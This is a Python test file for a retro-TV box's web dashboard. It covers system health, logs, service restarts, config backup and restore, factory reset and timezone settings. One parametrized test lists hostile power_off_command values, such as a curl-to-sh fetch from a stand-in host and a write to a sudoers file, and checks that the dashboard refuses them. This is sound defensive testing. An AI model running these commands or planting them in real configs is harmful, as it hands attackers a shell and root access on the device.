"""The System section: everything that was left as a reason to SSH in.

Health, logs, restarting things, checking the remote works, backing the config
up and putting it back, and the clock. Between them these are the last of the
routine reasons to open a terminal on one of these boxes.
"""

import threading
from pathlib import Path
from types import SimpleNamespace

import pytest

from retrobox import configwrite, servicectl, sysinfo
from retrobox.config import load_config
from tests.helpers import make_show

flask = pytest.importorskip("flask")
from retrobox.webui import create_app  # noqa: E402


@pytest.fixture
def runtime(monkeypatch, tmp_path):
    monkeypatch.setenv("RETROBOX_STATUS_PATH", str(tmp_path / "status.json"))
    monkeypatch.setenv("RETROBOX_CONTROL_SOCKET", str(tmp_path / "c.sock"))


@pytest.fixture
def box(tmp_path, runtime, monkeypatch):
    root = tmp_path / "media"
    root.mkdir()
    make_show(root, "sitcoms", 2)
    cfg = tmp_path / "config.yaml"
    cfg.write_text(
        f"# hand written\nmedia_root: {root}\n"
        f"channels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    # Nothing in these tests may shell out to the real machine.
    monkeypatch.setattr(sysinfo, "_run", lambda cmd, **k: "")
    monkeypatch.setattr(
        sysinfo.shutil, "disk_usage",
        lambda p: SimpleNamespace(total=500 * 1024**3, used=100 * 1024**3,
                                  free=400 * 1024**3),
    )
    monkeypatch.setattr(sysinfo.hwdetect, "build_report", lambda **k: (_ for _ in ()).throw(OSError()))
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    return app.test_client(), cfg, root


@pytest.fixture
def ran(monkeypatch):
    calls = []
    monkeypatch.setattr(servicectl, "_run", lambda cmd, **kw: (calls.append(cmd), (0, ""))[1])
    return calls


# ==========================================================================
# Health
# ==========================================================================
def test_the_system_page_answers_is_my_box_alright(box):
    client, _, root = box
    data = client.get("/api/system").get_json()
    assert data["version"]
    assert data["storage"]["root"]["state"] == "ok"
    assert data["storage"]["media"]["path"] == str(root)
    assert "decode" in data["hardware"]


def test_low_disk_space_is_flagged(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo.shutil, "disk_usage",
        lambda p: SimpleNamespace(total=16 * 1024**3, used=16 * 1024**3, free=1024),
    )
    data = client.get("/api/system").get_json()
    assert data["storage"]["warning"] is True
    assert data["storage"]["root"]["state"] == "critical"


def test_every_missing_source_still_produces_a_page(box, monkeypatch, tmp_path):
    client, _, _ = box

    def refuse(*a, **k):
        raise OSError("nothing works here")

    monkeypatch.setattr(sysinfo.shutil, "disk_usage", refuse)
    monkeypatch.setattr(sysinfo.os, "getloadavg", refuse)
    monkeypatch.setattr(sysinfo, "THERMAL_ROOT", tmp_path / "nope")

    res = client.get("/api/system")
    assert res.status_code == 200
    data = res.get_json()
    assert data["temperature"] is None and data["load"] is None
    assert data["storage"]["root"] is None


def test_the_page_says_which_inputs_are_live(box, runtime):
    from retrobox import status as status_mod

    client, _, _ = box
    status_mod.write_status({
        "input": {"backends": ["keyboard", "web"], "recent": []},
    })
    assert client.get("/api/system").get_json()["input"]["backends"] == [
        "keyboard", "web",
    ]


def test_no_tv_running_does_not_break_the_page(box):
    client, _, _ = box
    data = client.get("/api/system").get_json()
    assert data["input"]["backends"] == []


# ==========================================================================
# Logs
# ==========================================================================
@pytest.fixture
def fake_journal(monkeypatch):
    import json as _json

    from retrobox import journal

    def runner(cmd, **kw):
        runner.calls.append(cmd)
        return runner.output

    runner.calls = []
    runner.output = _json.dumps({
        "__REALTIME_TIMESTAMP": "1700000000000000", "__CURSOR": "s=a;i=1",
        "PRIORITY": "6", "MESSAGE": "hello", "_SYSTEMD_UNIT": "retrobox.service",
    }) + "\n"
    monkeypatch.setattr(journal, "_run", runner)
    return runner


def test_logs_come_back_readable(box, fake_journal):
    client, _, _ = box
    data = client.get("/api/system/logs").get_json()
    assert data["entries"][0]["message"] == "hello"
    assert data["entries"][0]["level"] == "info"


def test_a_huge_request_is_capped(box, fake_journal):
    from retrobox import journal

    client, _, _ = box
    client.get("/api/system/logs?lines=999999")
    assert f"--lines={journal.MAX_LINES}" in fake_journal.calls[0]


def test_a_unit_that_is_not_ours_is_refused(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?unit=sshd.service").status_code == 400
    assert fake_journal.calls == [], "it asked journalctl anyway"


def test_a_bad_level_is_refused(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?level=shouty").status_code == 400


def test_logs_can_be_searched_and_paged(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?search=hello").get_json()["entries"]
    assert client.get("/api/system/logs?search=nothere").get_json()["entries"] == []
    client.get("/api/system/logs?after=s%3Da%3Bi%3D1")
    assert any("--after-cursor=" in a for a in fake_journal.calls[-1])


def test_the_support_bundle_is_one_block_of_text(box, fake_journal):
    client, _, _ = box
    res = client.get("/api/system/support")
    assert res.status_code == 200
    text = res.get_data(as_text=True)
    assert "RETRO BOX" in text and "hello" in text
    assert "Storage" in text


# ==========================================================================
# Service control
# ==========================================================================
@pytest.mark.parametrize(
    "action", ["restart-tv", "restart-dashboard", "reboot", "shutdown"]
)
def test_every_service_action_needs_confirming(box, ran, action):
    client, _, _ = box
    assert client.post(f"/api/system/service/{action}").status_code == 400
    assert ran == [], "it acted without being confirmed"

    assert client.post(f"/api/system/service/{action}?confirm=yes").status_code == 200
    assert len(ran) == 1


def test_an_action_that_is_not_on_the_list_is_refused(box, ran):
    client, _, _ = box
    res = client.post("/api/system/service/stop-the-firewall?confirm=yes")
    assert res.status_code in (400, 404)
    assert ran == []


def test_restarting_the_dashboard_warns_the_page_first(box, ran):
    client, _, _ = box
    body = client.post("/api/system/service/restart-dashboard?confirm=yes").get_json()
    assert "reconnect" in body["message"].lower()


def test_a_failed_command_is_reported_not_swallowed(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "_run", lambda cmd, **kw: (1, "sudo: a password is required")
    )
    res = client.post("/api/system/service/reboot?confirm=yes")
    assert res.status_code == 503
    assert "password" in res.get_json()["error"]


# ==========================================================================
# Config backup and restore
# ==========================================================================
def test_the_config_can_be_downloaded(box):
    client, cfg, _ = box
    res = client.get("/api/system/config")
    assert res.status_code == 200
    assert res.get_data(as_text=True) == cfg.read_text()
    assert "attachment" in res.headers.get("Content-Disposition", "")


def test_a_valid_config_can_be_restored(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    replacement = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config?confirm=yes", data=replacement,
                      content_type="text/yaml")
    assert res.status_code == 200, res.get_json()
    assert [c.name for c in load_config(cfg).channels] == ["Restored"]


def test_replacing_the_whole_config_has_to_be_confirmed(box, monkeypatch):
    """The same guard the backup restore and the factory reset already have.

    This route throws away every setting on the box in one request, from a
    dashboard that has no password. Anything that destructive asks first.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = cfg.read_text()
    replacement = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config", data=replacement,
                      content_type="text/yaml")
    assert res.status_code == 400
    assert cfg.read_text() == before, "the live config was replaced anyway"


@pytest.mark.parametrize(
    "bad",
    [
        "channels: [[[ not yaml",
        "",
        "just a string",
        "channels: []",
        "channels:\n  - number: 2\n    name: A\n    path: /does/not/exist\n",
        "channels:\n  - number: 2\n    name: A\n    path: /x\n  - number: 2\n    name: B\n    path: /x\n",
    ],
)
def test_a_config_that_would_not_boot_is_refused(box, bad):
    client, cfg, _ = box
    before = cfg.read_text()
    res = client.post("/api/system/config?confirm=yes", data=bad,
                      content_type="text/yaml")
    assert res.status_code == 400, bad
    assert cfg.read_text() == before, "the live config was replaced anyway"


def test_a_restored_config_whose_dayparts_point_nowhere_is_refused(box):
    """The same check the channel folders get, for the folders inside a schedule.

    A daypart that names a folder which is not on this box is a channel that
    goes silent at a particular hour of the evening and says nothing about why,
    which is the hardest kind of fault to report over the phone.
    """
    client, cfg, root = box
    before = cfg.read_text()
    bad = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
        f"    dayparts:\n"
        f'      - from: "18:00"\n        to: "20:00"\n'
        f'        path: {root / "sitcmos"}\n'
    )

    res = client.post("/api/system/config?confirm=yes", data=bad,
                      content_type="text/yaml")
    assert res.status_code == 400, res.get_json()
    assert "sitcmos" in res.get_json()["error"]
    assert cfg.read_text() == before, "the live config was replaced anyway"


# --------------------------------------------------------------------------
# The power-off command, which is the one config value that becomes argv
# --------------------------------------------------------------------------
@pytest.mark.parametrize(
    "hostile",
    [
        '["/bin/sh", "-c", "curl http://evil.example/x | sh"]',
        '["sh", "-c", "id > /tmp/pwned"]',
        '["sudo", "tee", "/etc/sudoers.d/evil"]',
        '["sudo", "systemctl", "start", "evil.service"]',
        '["python3", "-c", "import os; os.system(\'id\')"]',
        '"/bin/sh -c whoami"',
        '["/home/pi/payload.sh"]',
    ],
)
def test_an_uploaded_config_cannot_turn_the_power_button_into_a_shell(box, hostile):
    """The hole this whole section exists for.

    ``power_off_command`` is handed to ``subprocess.Popen`` by the television
    the next time anyone shuts the box down - the dashboard's own button, the
    sleep timer, or volume-down past zero. This route has no password, so a
    config naming anything other than a shutdown is refused outright and the
    file on disk is left exactly where it was.
    """
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {root}\npower_off_command: {hostile}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )

    res = client.post("/api/system/config?confirm=yes", data=document,
                      content_type="text/yaml")
    assert res.status_code == 400, res.get_json()
    assert "power_off_command" in res.get_json()["error"]
    assert cfg.read_text() == before, "the live config was replaced anyway"
    assert load_config(cfg).power_off_command == ("sudo", "poweroff")


@pytest.mark.parametrize(
    "allowed",
    ['["sudo", "poweroff"]', "[]", '"sudo poweroff"', '["sudo", "-n", "poweroff"]'],
)
def test_the_legitimate_power_off_commands_still_upload(box, monkeypatch, allowed):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    document = (
        f"media_root: {root}\npower_off_command: {allowed}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config?confirm=yes", data=document,
                      content_type="text/yaml")
    assert res.status_code == 200, res.get_json()


def test_the_backup_restore_will_not_put_a_hostile_power_off_command_back(
    box, monkeypatch
):
    """A backup is a file on the box, and files on the box can be written to.

    The upload route is not the only door: whatever wrote ``config.yaml.bak``
    is trusted no more than an upload is, so the same check runs here.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    client.patch("/api/channels/2", json={"name": "Changed"})  # makes the .bak
    backup = cfg.with_name(cfg.name + ".bak")
    assert backup.is_file()
    backup.write_text(
        f"media_root: {root}\n"
        f'power_off_command: ["/bin/sh", "-c", "id"]\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n',
        encoding="utf-8",
    )

    res = client.post("/api/system/config/backup/restore?confirm=yes")
    assert res.status_code == 400, res.get_json()
    assert "power_off_command" in res.get_json()["error"]
    assert load_config(cfg).power_off_command == ("sudo", "poweroff")


def test_the_pre_automation_backup_is_offered(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    original = cfg.read_text()
    # Any dashboard edit creates config.yaml.bak the first time.
    client.patch("/api/channels/2", json={"name": "Changed"})

    info = client.get("/api/system/config/backup").get_json()
    assert info["exists"] is True
    assert info["bytes"] == len(original.encode())


def test_restoring_the_backup_puts_the_original_back(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    original = cfg.read_text()
    client.patch("/api/channels/2", json={"name": "Changed"})
    assert load_config(cfg).channels[0].name == "Changed"

    assert client.post("/api/system/config/backup/restore").status_code == 400
    res = client.post("/api/system/config/backup/restore?confirm=yes")
    assert res.status_code == 200, res.get_json()
    assert cfg.read_text() == original
    assert load_config(cfg).channels[0].name == "Sitcoms"


def test_there_is_no_backup_to_restore_before_anything_edited_it(box):
    client, _, _ = box
    assert client.get("/api/system/config/backup").get_json()["exists"] is False
    assert client.post("/api/system/config/backup/restore?confirm=yes").status_code == 404


# ==========================================================================
# Factory reset
# ==========================================================================
def test_factory_reset_asks_twice(box, monkeypatch):
    client, cfg, _ = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = cfg.read_text()

    assert client.post("/api/system/factory-reset").status_code == 400
    assert client.post("/api/system/factory-reset?confirm=yes").status_code == 400
    assert cfg.read_text() == before

    res = client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})
    assert res.status_code == 200, res.get_json()


def test_factory_reset_does_not_touch_a_single_video_file(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = sorted(p.name for p in (root / "sitcoms").iterdir())
    assert before, "the fixture should have made episodes"

    client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})

    assert (root / "sitcoms").is_dir(), "the library folder was deleted"
    assert sorted(p.name for p in (root / "sitcoms").iterdir()) == before


def test_factory_reset_leaves_a_config_the_box_can_still_boot(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})

    reloaded = load_config(cfg)
    assert reloaded.channels, "the box was left with no channels at all"
    assert reloaded.media_root == root


def test_factory_reset_says_plainly_that_media_is_kept(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    body = client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    ).get_json()
    assert "video" in body["message"].lower() or "media" in body["message"].lower()


@pytest.mark.parametrize("library", ["Films #2", "Films: the good ones"])
def test_factory_reset_keeps_a_library_folder_yaml_would_misread(
    tmp_path, runtime, monkeypatch, library
):
    """The folder name goes back into YAML as a value, not as raw text.

    Pasted straight in, ``media_root: /media/Films #2`` loads back as
    ``/media/Films`` - YAML reads the rest as a comment - and if that sibling
    folder happens to exist, a factory reset quietly rebuilds the whole lineup
    from somebody else's library and writes that into config.yaml. The decoy
    below is that sibling. A name with ": " in it is worse again: the document
    will not parse at all, and the customer is told their own factory reset
    "will not load".
    """
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    root = tmp_path / library
    root.mkdir()
    make_show(root, "sitcoms", 2)
    decoy = tmp_path / "Films"          # what a stripped comment would land on
    decoy.mkdir()
    make_show(decoy, "wrong library", 2)

    cfg = tmp_path / "config.yaml"
    cfg.write_text(f'media_root: "{root}"\n', encoding="utf-8")
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    client = app.test_client()

    res = client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    )
    assert res.status_code == 200, res.get_json()

    reloaded = load_config(cfg)
    assert reloaded.media_root == root, "the reset pointed the box at another folder"
    assert [c.name for c in reloaded.channels] == ["Sitcoms"]


# ==========================================================================
# Replacing the whole file while somebody else is editing it
# ==========================================================================
def _upload_a_config(client, cfg, root):
    return client.post(
        "/api/system/config?confirm=yes",
        data=f"media_root: {root}\nchannels:\n"
             f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n',
        content_type="text/yaml",
    )


def _restore_the_backup(client, cfg, root):
    return client.post("/api/system/config/backup/restore?confirm=yes")


def _factory_reset(client, cfg, root):
    return client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    )


@pytest.mark.parametrize(
    "replace_the_whole_file",
    [_upload_a_config, _restore_the_backup, _factory_reset],
    ids=["an uploaded config", "the backup", "a factory reset"],
)
def test_no_edit_can_slip_in_while_the_whole_config_is_replaced(
    box, monkeypatch, replace_the_whole_file
):
    """The lost update the ConfigStore lock exists to prevent.

    Somebody restores config.yaml from a laptop while somebody else renames a
    channel from a phone. The rename reads the file, the restore lands, and the
    rename then writes its whole stale copy back over it - the restore is gone
    and both people were told "saved". Replacing the file has to take the same
    lock every edit takes, so an edit cannot even begin while one is landing.

    Held here at the moment of the write, an edit that gets in is an edit that
    read a config which is about to stop existing.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    # There has to be something to restore for the backup case.
    cfg.with_name(cfg.name + ".bak").write_text(cfg.read_text(), encoding="utf-8")

    at_the_write = threading.Event()
    let_it_finish = threading.Event()
    real_write = configwrite.atomic_write_bytes

    def paused_write(path, data):
        # Only the first write of config.yaml itself waits - the edit's own
        # write, if it manages one, must go straight through.
        if Path(path).name == cfg.name and not at_the_write.is_set():
            at_the_write.set()
            let_it_finish.wait(timeout=10)
        return real_write(path, data)

    monkeypatch.setattr(configwrite, "atomic_write_bytes", paused_write)

    replacing = threading.Thread(
        target=lambda: replace_the_whole_file(client, cfg, root)
    )
    replacing.start()
    assert at_the_write.wait(timeout=10), "it never got as far as writing the file"

    edited = threading.Event()
    editor = client.application.test_client()

    def rename():
        try:
            editor.patch("/api/channels/2", json={"name": "Renamed"})
        finally:
            edited.set()

    renaming = threading.Thread(target=rename)
    renaming.start()
    try:
        assert not edited.wait(timeout=0.5), (
            "an edit read and rewrote the config while it was being replaced"
        )
    finally:
        let_it_finish.set()
        renaming.join(timeout=10)
        replacing.join(timeout=10)

    assert not renaming.is_alive() and not replacing.is_alive()


# ==========================================================================
# The clock
# ==========================================================================
def test_the_clock_is_reported(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Timezone=Europe/London\nNTPSynchronized=yes\nNTP=yes\n"
        if "show" in cmd else "",
    )
    data = client.get("/api/system").get_json()["timezone"]
    assert data["timezone"] == "Europe/London"
    assert data["synchronised"] is True and data["warning"] is False


def test_an_unsynchronised_clock_warns_because_dayparting_drifts(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Timezone=UTC\nNTPSynchronized=no\nNTP=no\n"
        if "show" in cmd else "",
    )
    assert client.get("/api/system").get_json()["timezone"]["warning"] is True


def test_the_timezone_list_is_offered(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\nUTC\n" if "list-timezones" in cmd else "",
    )
    assert client.get("/api/system/timezones").get_json()["timezones"] == [
        "Europe/London", "UTC",
    ]


def test_the_timezone_can_be_changed(box, monkeypatch, ran):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\nUTC\n" if "list-timezones" in cmd else "",
    )
    res = client.post("/api/system/timezone", json={"timezone": "UTC"})
    assert res.status_code == 200, res.get_json()
    assert ran == [["sudo", "-n", "timedatectl", "set-timezone", "UTC"]]


def test_a_timezone_the_box_does_not_have_is_refused(box, monkeypatch, ran):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\n" if "list-timezones" in cmd else "",
    )
    res = client.post("/api/system/timezone", json={"timezone": "Mars/Olympus"})
    assert res.status_code == 400
    assert ran == []
